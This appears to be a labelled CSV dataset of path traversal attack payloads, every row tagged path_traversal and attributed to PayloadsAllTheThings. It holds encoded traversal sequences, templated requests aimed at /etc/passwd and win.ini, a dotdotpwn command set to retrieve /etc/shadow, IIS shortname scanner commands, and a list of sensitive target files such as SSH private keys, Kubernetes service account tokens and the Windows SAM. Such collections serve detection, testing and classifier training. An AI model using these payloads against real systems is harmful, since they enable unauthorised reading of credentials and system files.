payload,label,source
perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b,path_traversal,payloads_all_the_things
..,path_traversal,payloads_all_the_things
../,path_traversal,payloads_all_the_things
..\,path_traversal,payloads_all_the_things
..\/,path_traversal,payloads_all_the_things
%2e%2e%2f,path_traversal,payloads_all_the_things
%252e%252e%252f,path_traversal,payloads_all_the_things
%c0%ae%c0%ae%c0%af,path_traversal,payloads_all_the_things
%uff0e%uff0e%u2215,path_traversal,payloads_all_the_things
%uff0e%uff0e%u2216,path_traversal,payloads_all_the_things
{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd,path_traversal,payloads_all_the_things
{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini,path_traversal,payloads_all_the_things
{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini,path_traversal,payloads_all_the_things
{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp,path_traversal,payloads_all_the_things
..././,path_traversal,payloads_all_the_things
...\.\,path_traversal,payloads_all_the_things
{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini,path_traversal,payloads_all_the_things
%00,path_traversal,payloads_all_the_things
{{BaseURL}}/.%00./.%00./etc/passwd,path_traversal,payloads_all_the_things
{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm,path_traversal,payloads_all_the_things
/..;/,path_traversal,payloads_all_the_things
/../,path_traversal,payloads_all_the_things
..;/,path_traversal,payloads_all_the_things
{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}},path_traversal,payloads_all_the_things
\\UNC\share\name,path_traversal,payloads_all_the_things
\\localhost\c$\windows\win.ini,path_traversal,payloads_all_the_things
http://example.com/page.aspx,path_traversal,payloads_all_the_things
http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx,path_traversal,payloads_all_the_things
(S(...)),path_traversal,payloads_all_the_things
/(S(X))/,path_traversal,payloads_all_the_things
/(Y(Z))/,path_traversal,payloads_all_the_things
/(G(AAA-BBB)D(CCC=DDD)E(0-1))/,path_traversal,payloads_all_the_things
/(S(X))/admin/(S(X))/main.aspx,path_traversal,payloads_all_the_things
/(S(x))/b/(S(x))in/Navigator.dll,path_traversal,payloads_all_the_things
/MyApp/(S(X))/,path_traversal,payloads_all_the_things
/admin/(S(X))/main.aspx,path_traversal,payloads_all_the_things
/admin/Foobar/(S(X))/../(S(X))/main.aspx,path_traversal,payloads_all_the_things
java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/',path_traversal,payloads_all_the_things
java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/',path_traversal,payloads_all_the_things
shortscan http://example.org/,path_traversal,payloads_all_the_things
new URL(''),path_traversal,payloads_all_the_things
url:file:///etc/passwd,path_traversal,payloads_all_the_things
url:http://127.0.0.1:8080,path_traversal,payloads_all_the_things
Operating System and Informations,path_traversal,payloads_all_the_things
/etc/issue,path_traversal,payloads_all_the_things
/etc/group,path_traversal,payloads_all_the_things
/etc/hosts,path_traversal,payloads_all_the_things
/etc/motd,path_traversal,payloads_all_the_things
"/proc/[0-9]*/fd/[0-9]*   # first number is the PID, second is the filedescriptor",path_traversal,payloads_all_the_things
/proc/self/environ,path_traversal,payloads_all_the_things
/proc/version,path_traversal,payloads_all_the_things
/proc/cmdline,path_traversal,payloads_all_the_things
/proc/sched_debug,path_traversal,payloads_all_the_things
/proc/mounts,path_traversal,payloads_all_the_things
/proc/net/arp,path_traversal,payloads_all_the_things
/proc/net/route,path_traversal,payloads_all_the_things
/proc/net/tcp,path_traversal,payloads_all_the_things
/proc/net/udp,path_traversal,payloads_all_the_things
/proc/self/cwd/index.php,path_traversal,payloads_all_the_things
/proc/self/cwd/main.py,path_traversal,payloads_all_the_things
/var/lib/mlocate/mlocate.db,path_traversal,payloads_all_the_things
/var/lib/plocate/plocate.db,path_traversal,payloads_all_the_things
/var/lib/mlocate.db,path_traversal,payloads_all_the_things
/etc/shadow,path_traversal,payloads_all_the_things
/home/$USER/.bash_history,path_traversal,payloads_all_the_things
/home/$USER/.ssh/id_rsa,path_traversal,payloads_all_the_things
/etc/mysql/my.cnf,path_traversal,payloads_all_the_things
/run/secrets/kubernetes.io/serviceaccount/token,path_traversal,payloads_all_the_things
/run/secrets/kubernetes.io/serviceaccount/namespace,path_traversal,payloads_all_the_things
/run/secrets/kubernetes.io/serviceaccount/certificate,path_traversal,payloads_all_the_things
/var/run/secrets/kubernetes.io/serviceaccount,path_traversal,payloads_all_the_things
C:\Windows\win.ini,path_traversal,payloads_all_the_things
C:\windows\system32\license.rtf,path_traversal,payloads_all_the_things
c:/inetpub/logs/logfiles,path_traversal,payloads_all_the_things
c:/inetpub/wwwroot/global.asa,path_traversal,payloads_all_the_things
c:/inetpub/wwwroot/index.asp,path_traversal,payloads_all_the_things
c:/inetpub/wwwroot/web.config,path_traversal,payloads_all_the_things
c:/sysprep.inf,path_traversal,payloads_all_the_things
c:/sysprep.xml,path_traversal,payloads_all_the_things
c:/sysprep/sysprep.inf,path_traversal,payloads_all_the_things
c:/sysprep/sysprep.xml,path_traversal,payloads_all_the_things
c:/system32/inetsrv/metabase.xml,path_traversal,payloads_all_the_things
c:/system volume information/wpsettings.dat,path_traversal,payloads_all_the_things
c:/unattend.txt,path_traversal,payloads_all_the_things
c:/unattend.xml,path_traversal,payloads_all_the_things
c:/unattended.txt,path_traversal,payloads_all_the_things
c:/unattended.xml,path_traversal,payloads_all_the_things
c:/windows/repair/sam,path_traversal,payloads_all_the_things
c:/windows/repair/system,path_traversal,payloads_all_the_things
../{FILE},path_traversal,payloads_all_the_things
../../{FILE},path_traversal,payloads_all_the_things
../../../{FILE},path_traversal,payloads_all_the_things
../../../../{FILE},path_traversal,payloads_all_the_things
../../../../../{FILE},path_traversal,payloads_all_the_things
../../../../../../{FILE},path_traversal,payloads_all_the_things
../../../../../../../{FILE},path_traversal,payloads_all_the_things
../../../../../../../../{FILE},path_traversal,payloads_all_the_things
..;/{FILE},path_traversal,payloads_all_the_things
..;/..;/{FILE},path_traversal,payloads_all_the_things
..;/..;/..;/{FILE},path_traversal,payloads_all_the_things
..;/..;/..;/..;/{FILE},path_traversal,payloads_all_the_things
..;/..;/..;/..;/..;/{FILE},path_traversal,payloads_all_the_things
..;/..;/..;/..;/..;/..;/{FILE},path_traversal,payloads_all_the_things
..;/..;/..;/..;/..;/..;/..;/{FILE},path_traversal,payloads_all_the_things
..;/..;/..;/..;/..;/..;/..;/..;/{FILE},path_traversal,payloads_all_the_things
..%2f{FILE},path_traversal,payloads_all_the_things
..%2f..%2f{FILE},path_traversal,payloads_all_the_things
..%2f..%2f..%2f{FILE},path_traversal,payloads_all_the_things
..%2f..%2f..%2f..%2f{FILE},path_traversal,payloads_all_the_things
..%2f..%2f..%2f..%2f..%2f{FILE},path_traversal,payloads_all_the_things
..%2f..%2f..%2f..%2f..%2f..%2f{FILE},path_traversal,payloads_all_the_things
..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},path_traversal,payloads_all_the_things
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},path_traversal,payloads_all_the_things
%2e%2e/{FILE},path_traversal,payloads_all_the_things
